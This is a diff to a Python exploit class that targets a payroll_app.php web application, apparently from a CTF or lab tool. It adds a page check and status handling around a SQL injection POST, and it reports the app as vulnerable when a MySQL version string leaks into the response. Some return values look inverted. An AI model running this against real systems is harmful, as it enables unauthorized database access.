@@ -14,6 +14,17 @@ class Payroll:
         self.__port = 80
         self.__path = "/payroll_app.php"
 
+    def __check(self):
+        exists = 'Payroll Login'
+        r = requests.get(f"http://{self.__host}:{self.__port}{self.__path}")
+        if r.status_code != 200:
+            log.info(f"[!] Invalid status code received ({self.__host})")
+            return False
+        if exists not in r.text:
+            log.info(f"[!] Unexpected data returned. Thought they were slick. ({self.__host})")
+            return False
+        return True
+
     def __exploit(self):
         sql = {
             "user": "defcon",
@@ -22,6 +33,9 @@ class Payroll:
         }
         check = "5.5.62-0ubuntu0.14.04.1"
         r = requests.post(f"http://{self.__host}:{self.__port}{self.__path}", data=sql)
+        if r.status_code != 200:
+            log.info(f"[!] Invalid status code received ({self.__host})")
+            return True
         if check in r.text:
             log.info(f"[!] Payroll app is vulnerable ({self.__host})")
             return True
@@ -33,6 +47,8 @@ class Payroll:
         log.debug(f"[*] Exploiting Payroll App ({self.__host})")
         if port:
             self.__port = port
+        if not self.__check():
+            return True
         return self.__exploit()
 
 
